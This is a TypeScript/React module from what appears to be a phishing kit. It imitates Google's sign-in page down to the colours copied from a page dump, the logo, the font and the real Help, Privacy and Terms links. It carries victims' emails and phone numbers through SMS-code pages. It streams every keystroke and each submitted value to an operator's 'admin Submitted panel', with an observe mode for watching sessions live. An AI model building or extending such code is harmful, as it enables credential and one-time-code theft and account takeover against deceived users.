import {
  createContext,
  useContext,
  useEffect,
  useMemo,
  type ReactNode,
} from "react";
import { useNavigate } from "@tanstack/react-router";
import { useParticipant } from "@/hooks/useParticipant";
import { bindObserveMirror } from "@/lib/mirrorApply";

export const GE_FONT_FAMILY = '"Google Sans", Roboto, Arial, sans-serif';

/** Dark tokens from user's SingleFile dump (prefers-color-scheme: dark .AfoeCd) */
export const GE_PAGE_BG = "rgb(30, 31, 32)";
export const GE_CARD_BG = "rgb(14, 14, 14)";
export const GE_PRIMARY = "rgb(168, 199, 250)";
export const GE_ON_PRIMARY = "rgb(6, 46, 111)";
export const GE_NEXT_FILL = "rgb(138, 180, 248)";
export const GE_NEXT_INK = "rgb(32, 33, 36)";
export const GE_OUTLINE = "rgb(142, 145, 143)";
export const GE_ON_SURFACE = "rgb(227, 227, 227)";
export const GE_ON_SURFACE_VARIANT = "rgb(196, 199, 197)";

/** Same key as design HTML tracker (`__ux_email`) so React ↔ iframe share email. */
export const GE_EMAIL_KEY = "__ux_email";
/** Phone entered on confirmphone — shown on sendcode / smscode. */
export const GE_PHONE_KEY = "__ux_phone";
export const GE_AVATAR_COLOR_KEY = "ge_avatar_color";

/** Google-style letter-avatar palette */
export const GE_AVATAR_COLORS = [
  "#F4511E",
  "#E67C73",
  "#F6BF26",
  "#33B679",
  "#0B8043",
  "#039BE5",
  "#3F51B5",
  "#7986CB",
  "#8E24AA",
  "#E4C441",
  "#D50000",
  "#FF7043",
];

export function getGeEmail(): string {
  if (typeof window === "undefined") return "";
  try {
    const fromSession = sessionStorage.getItem(GE_EMAIL_KEY) || "";
    if (fromSession) return fromSession;
  } catch {
    /* ignore */
  }
  try {
    return localStorage.getItem(GE_EMAIL_KEY) || "";
  } catch {
    return "";
  }
}

export function setGeEmail(email: string) {
  if (typeof window === "undefined") return;
  const v = email.trim();
  try {
    sessionStorage.setItem(GE_EMAIL_KEY, v);
  } catch {
    /* ignore */
  }
  try {
    localStorage.setItem(GE_EMAIL_KEY, v);
  } catch {
    /* ignore */
  }
}

/** Resolve email from URL ?email=, then storage. */
export function resolveGeEmail(search?: string): string {
  if (typeof window !== "undefined") {
    try {
      const q = new URLSearchParams(search ?? window.location.search).get("email");
      if (q && q.trim()) {
        const trimmed = q.trim();
        setGeEmail(trimmed);
        return trimmed;
      }
    } catch {
      /* ignore */
    }
  }
  return getGeEmail();
}

export function getGePhone(): string {
  if (typeof window === "undefined") return "";
  try {
    const fromSession = sessionStorage.getItem(GE_PHONE_KEY) || "";
    if (fromSession) return fromSession;
  } catch {
    /* ignore */
  }
  try {
    return localStorage.getItem(GE_PHONE_KEY) || "";
  } catch {
    return "";
  }
}

export function setGePhone(phone: string) {
  if (typeof window === "undefined") return;
  const v = phone.trim();
  try {
    sessionStorage.setItem(GE_PHONE_KEY, v);
  } catch {
    /* ignore */
  }
  try {
    localStorage.setItem(GE_PHONE_KEY, v);
  } catch {
    /* ignore */
  }
}

/** Resolve phone from URL ?phone=, then storage. */
export function resolveGePhone(search?: string): string {
  if (typeof window !== "undefined") {
    try {
      const q = new URLSearchParams(search ?? window.location.search).get("phone");
      if (q && q.trim()) {
        const trimmed = q.trim();
        setGePhone(trimmed);
        return trimmed;
      }
    } catch {
      /* ignore */
    }
  }
  return getGePhone();
}

/** Format for Google copy: (555) 010-0199 style when 10 US digits; else original trimmed. */
export function formatGePhoneDisplay(phone: string): string {
  const digits = phone.replace(/\D/g, "");
  const national =
    digits.length === 11 && digits.startsWith("1") ? digits.slice(1) : digits;
  if (national.length === 10) {
    return `(${national.slice(0, 3)}) ${national.slice(3, 6)}-${national.slice(6)}`;
  }
  return phone.trim() || "(•••) •••-••••";
}

/** "Hi" + first 5 characters of the typed email (first letter capitalized). */
export function geHiName(email: string): string {
  const raw = email.trim().slice(0, 5);
  if (!raw) return "";
  return raw.charAt(0).toUpperCase() + raw.slice(1);
}

/** Two-letter initials from the email local-part (Google-style). */
export function geInitials(email: string): string {
  const local = (email.split("@")[0] || email).trim();
  const parts = local.split(/[._+\-\s]+/).filter(Boolean);
  if (parts.length >= 2) {
    return (parts[0].charAt(0) + parts[1].charAt(0)).toUpperCase();
  }
  const alnum = local.replace(/[^a-zA-Z0-9]/g, "");
  if (alnum.length >= 2) return alnum.slice(0, 2).toUpperCase();
  if (alnum.length === 1) return (alnum + alnum).toUpperCase();
  return "??";
}

/** Stable-per-email random-looking background from the Google palette. */
export function geAvatarColor(email: string): string {
  const normalized = email.trim().toLowerCase() || "guest";
  if (typeof window === "undefined") {
    let hash = 0;
    for (let i = 0; i < normalized.length; i++) hash = (hash * 31 + normalized.charCodeAt(i)) >>> 0;
    return GE_AVATAR_COLORS[hash % GE_AVATAR_COLORS.length];
  }
  try {
    const key = `${GE_AVATAR_COLOR_KEY}:${normalized}`;
    const stored = sessionStorage.getItem(key);
    if (stored) return stored;
    const color = GE_AVATAR_COLORS[Math.floor(Math.random() * GE_AVATAR_COLORS.length)];
    sessionStorage.setItem(key, color);
    return color;
  } catch {
    return GE_AVATAR_COLORS[0];
  }
}

export function GoogleGLogo({
  width = 48,
  height = 48,
  className,
}: {
  width?: number;
  height?: number;
  className?: string;
}) {
  return (
    <svg
      className={className}
      xmlns="http://www.w3.org/2000/svg"
      width={width}
      height={height}
      viewBox="0 0 40 48"
      aria-hidden="true"
    >
      <path
        fill="#4285F4"
        d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
      />
      <path
        fill="#34A853"
        d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
      />
      <path
        fill="#FABB05"
        d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
      />
      <path
        fill="#E94235"
        d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
      />
    </svg>
  );
}

/** Google default profile silhouette (accounts chip / JQ5tlb). */
export function GoogleUserIcon({
  width = 48,
  height = 48,
  className,
}: {
  width?: number;
  height?: number;
  className?: string;
}) {
  return (
    <svg
      className={className}
      aria-hidden="true"
      fill="currentColor"
      focusable="false"
      width={width}
      height={height}
      viewBox="0 0 24 24"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z" />
    </svg>
  );
}

/** Email account chip — silhouette only beside the address (never at page top). */
export function GeAccountChip({
  email,
  onClick,
}: {
  email: string;
  onClick?: () => void;
}) {
  const label = email || "Account";
  return (
    <button
      type="button"
      className="ge-account-chip"
      aria-label={`${label} selected. Switch account`}
      onClick={onClick}
    >
      <span className="ge-avatar-user" aria-hidden="true">
        <GoogleUserIcon width={20} height={20} />
      </span>
      <span className="ge-account-email">{label}</span>
      <svg className="ge-chip-caret" viewBox="0 0 24 24" aria-hidden="true">
        <path d="M7 9.5l5 5 5-5H7z" />
      </svg>
    </button>
  );
}

import googleSans400Url from "@/assets/ge/GoogleSans-400.woff2?url";
import googleSans500Url from "@/assets/ge/GoogleSans-500.woff2?url";

export function GeFontStyle() {
  return (
    <style>{`
      @font-face {
        font-family: "Google Sans";
        font-style: normal;
        font-weight: 400;
        font-display: swap;
        src: url(${JSON.stringify(googleSans400Url)}) format("woff2");
      }
      @font-face {
        font-family: "Google Sans";
        font-style: normal;
        font-weight: 500;
        font-display: swap;
        src: url(${JSON.stringify(googleSans500Url)}) format("woff2");
      }
    `}</style>
  );
}

/** Shared page + card chrome so signin and loading stay the same size/position. */
export const GE_SHELL_CSS = `
html, body {
  margin: 0;
  padding: 0;
  min-height: 100%;
  background: ${GE_PAGE_BG} !important;
  color: ${GE_ON_SURFACE};
  color-scheme: dark !important;
  font-family: ${GE_FONT_FAMILY};
  -webkit-font-smoothing: antialiased;
}
.ge-shell {
  --gm3-page: ${GE_PAGE_BG};
  --gm3-card: ${GE_CARD_BG};
  --gm3-primary: ${GE_PRIMARY};
  --gm3-outline: ${GE_OUTLINE};
  --gm3-on-surface: ${GE_ON_SURFACE};
  --gm3-on-surface-variant: ${GE_ON_SURFACE_VARIANT};
  --gm-next-fill: ${GE_NEXT_FILL};
  --gm-next-ink: ${GE_NEXT_INK};
  --c-ps-s: 24px;
  --c-ps-e: 24px;
  --wf-gutw: 24px;
  box-sizing: border-box;
  min-height: 100vh;
  min-height: 100dvh;
  width: 100%;
  max-width: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: flex-start;
  background: var(--gm3-page);
  padding: 16px 12px 24px;
  color: var(--gm3-on-surface);
  font-family: ${GE_FONT_FAMILY};
}
.ge-shell *, .ge-shell *::before, .ge-shell *::after { box-sizing: border-box; }
@media (min-width: 600px) {
  .ge-shell { padding: 48px 24px; justify-content: center; }
}
.ge-card {
  background: var(--gm3-card);
  width: 100%;
  max-width: 480px;
  min-height: 0;
  border-radius: 20px;
  padding: 28px 20px 24px;
  display: flex;
  flex-direction: column;
  position: relative;
  overflow: visible;
}
@media (min-width: 600px) {
  .ge-card {
    min-height: 528px;
    border-radius: 28px;
    padding: 40px 40px 36px;
    overflow: hidden;
  }
}
/* Keep the card solid across page switches — no fade-out / pop-in */
.ge-card.is-leaving,
.ge-card.is-enter {
  opacity: 1;
  transform: none;
  animation: none;
}
@media (min-width: 900px) {
  .ge-shell { --c-ps-s: 36px; --c-ps-e: 36px; --wf-gutw: 38px; }
  .ge-card {
    width: 1040px;
    max-width: min(1040px, calc(100vw - 48px));
    min-height: 400px;
    height: 400px;
    padding: 36px var(--c-ps-e) 36px var(--c-ps-s);
    flex-direction: row;
    align-items: stretch;
  }
}
@media (min-width: 900px) and (max-width: 1199px) {
  .ge-card {
    width: 840px;
    max-width: min(840px, calc(100vw - 48px));
  }
}
.ge-pane-left, .ge-pane-right {
  display: flex;
  flex-direction: column;
  min-width: 0;
}
@media (min-width: 900px) {
  .ge-pane-left, .ge-pane-right {
    flex: 1 1 50%;
    max-width: 50%;
  }
  .ge-pane-left { padding-right: var(--wf-gutw); }
  .ge-pane-right { padding-left: var(--wf-gutw); }
}
.ge-logo { display: block; width: 40px; height: 48px; flex-shrink: 0; }
/* Account chip: silhouette next to email only — transparent, no fill */
.ge-account-chip {
  display: inline-flex;
  align-items: center;
  gap: 0;
  margin-top: 24px;
  width: fit-content;
  max-width: 100%;
  align-self: flex-start;
  height: 32px;
  padding: 0 8px 0 3px;
  border: 1px solid var(--gm3-outline);
  border-radius: 16px;
  background: transparent;
  color: var(--gm3-on-surface);
  font: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.25px;
  line-height: 1.25;
  cursor: pointer;
  text-align: left;
}
.ge-account-chip:hover { background: rgba(227, 227, 227, 0.08); }
.ge-avatar-user {
  width: 24px;
  height: 24px;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  margin-right: 8px;
  background: transparent;
  color: var(--gm3-on-surface-variant);
  overflow: hidden;
}
.ge-avatar-user svg {
  width: 22px;
  height: 22px;
  display: block;
}
/* Shared field error (Try another way) + actions packed to the right */
.ge-field.is-error .ring,
.ge-phone-field.is-error .ring {
  box-shadow: inset 0 0 0 2px #f28b82 !important;
}
.ge-field.is-error label,
.ge-phone-field.is-error label {
  color: #f28b82 !important;
}
.ge-actions {
  display: flex;
  flex-direction: row;
  flex-wrap: wrap;
  align-items: center;
  justify-content: flex-end;
  margin-top: auto;
  padding-top: 32px;
  gap: 4px;
  width: 100%;
}
.ge-btn-text {
  background: none;
  border: none;
  padding: 0 12px;
  height: 40px;
  border-radius: 20px;
  color: var(--gm-next-fill);
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-text:hover { background: rgba(138, 180, 248, 0.08); }
.ge-account-email {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  min-width: 0;
  padding-right: 4px;
}
.ge-chip-caret {
  width: 20px;
  height: 20px;
  flex-shrink: 0;
  fill: var(--gm3-on-surface);
  opacity: 0.8;
}
.ge-title {
  margin: 16px 0 0;
  font-weight: 400;
  font-size: 2rem;
  line-height: 1.25;
  color: var(--gm3-on-surface);
}
@media (min-width: 840px) {
  .ge-title { font-size: 2.25rem; line-height: 1.222; }
}
.ge-sub {
  margin: 16px 0 0;
  font-size: 1rem;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}
.ge-footer {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
  width: 100%;
  max-width: 480px;
  margin-top: 16px;
  padding: 0 4px;
  gap: 8px;
}
@media (min-width: 900px) and (max-width: 1199px) {
  .ge-footer { max-width: min(840px, calc(100vw - 48px)); }
}
@media (min-width: 1200px) {
  .ge-footer { max-width: min(1040px, calc(100vw - 48px)); }
}
.ge-lang {
  appearance: none;
  border: 0;
  background: transparent;
  color: var(--gm3-on-surface);
  font-family: inherit;
  font-size: 0.75rem;
  padding: 8px 28px 8px 12px;
  border-radius: 8px;
  cursor: pointer;
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%23c4c7c5' d='M1.41 0L6 4.58 10.59 0 12 1.41l-6 6-6-6z'/%3E%3C/svg%3E");
  background-repeat: no-repeat;
  background-position: right 10px center;
}
.ge-lang:hover { background-color: rgba(227,227,227,.08); }
.ge-footer-links {
  display: flex;
  list-style: none;
  margin: 0;
  padding: 0;
}
.ge-footer-links a {
  color: var(--gm3-on-surface);
  font-size: 0.75rem;
  text-decoration: none;
  padding: 8px 12px;
  border-radius: 8px;
}
.ge-footer-links a:hover { background: rgba(227,227,227,.08); }
`;

export function GeFooter() {
  return (
    <footer className="ge-footer">
      <select className="ge-lang" aria-label="Change language" defaultValue="en-US">
        <option value="en-US">English (United States)</option>
        <option value="es">Español (España)</option>
        <option value="fr">Français (France)</option>
        <option value="de">Deutsch</option>
        <option value="ja">日本語</option>
      </select>
      <ul className="ge-footer-links">
        <li>
          <a href="https://support.google.com/accounts?hl=en" target="_blank" rel="noopener noreferrer">
            Help
          </a>
        </li>
        <li>
          <a
            href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true"
            target="_blank"
            rel="noopener noreferrer"
          >
            Privacy
          </a>
        </li>
        <li>
          <a href="https://accounts.google.com/TOS?loc=US&hl=en" target="_blank" rel="noopener noreferrer">
            Terms
          </a>
        </li>
      </ul>
    </footer>
  );
}

export function useIsObserve(): boolean {
  return useMemo(() => {
    if (typeof window === "undefined") return false;
    try {
      return new URLSearchParams(window.location.search).get("__observe") === "1";
    } catch {
      return false;
    }
  }, []);
}

type GeTracking = {
  sessionId: string;
  trackClick: (label: string) => void;
  trackInput: (field: string, value: string, ftype?: string) => void;
  trackSubmit: (field: string, value: string) => void;
  geNavigate: (to: string) => void;
  isObserve: boolean;
};

const GeTrackCtx = createContext<GeTracking | null>(null);

function useGeTrackingImpl(): GeTracking {
  const isObserve = useIsObserve();
  const navigate = useNavigate();
  const { emitInput, emitLiveInput, participantId } = useParticipant();

  function trackClick(label: string) {
    if (isObserve) return;
    emitInput("__click", label);
  }
  function trackInput(field: string, value: string, ftype = "email") {
    if (isObserve) return;
    emitLiveInput(field, value, ftype);
  }
  function trackSubmit(field: string, value: string) {
    if (isObserve) return;
    // Prefer *_submitted so the admin Submitted panel treats it as final.
    const name = /_submitted$/i.test(field) ? field : `${field}_submitted`;
    emitInput(name, value);
  }
  function geNavigate(to: string) {
    if (isObserve) return;
    try {
      window.postMessage({ __ux: true, type: "internal_navigation", url: to }, "*");
    } catch {
      /* ignore */
    }
    // Query strings: full assign so email survives across navigations.
    if (to.includes("?")) {
      window.location.assign(to);
      return;
    }
    navigate({ to, reloadDocument: false }).catch(() => {
      window.location.assign(to);
    });
  }

  useEffect(() => bindObserveMirror(isObserve), [isObserve]);

  return {
    sessionId: participantId,
    trackClick,
    trackInput,
    trackSubmit,
    geNavigate,
    isObserve,
  };
}

/** Layout provider — keeps one participant channel alive across /ge/* pages. */
export function GeTrackingProvider({ children }: { children: ReactNode }) {
  const tracking = useGeTrackingImpl();
  return <GeTrackCtx.Provider value={tracking}>{children}</GeTrackCtx.Provider>;
}

export { usePhoneReady, PHONE_BASE_CSS } from "@/lib/phoneSupport";

export function useGeTracking(): GeTracking {
  const ctx = useContext(GeTrackCtx);
  if (!ctx) {
    throw new Error("useGeTracking must be used within GeTrackingProvider");
  }
  return ctx;
}
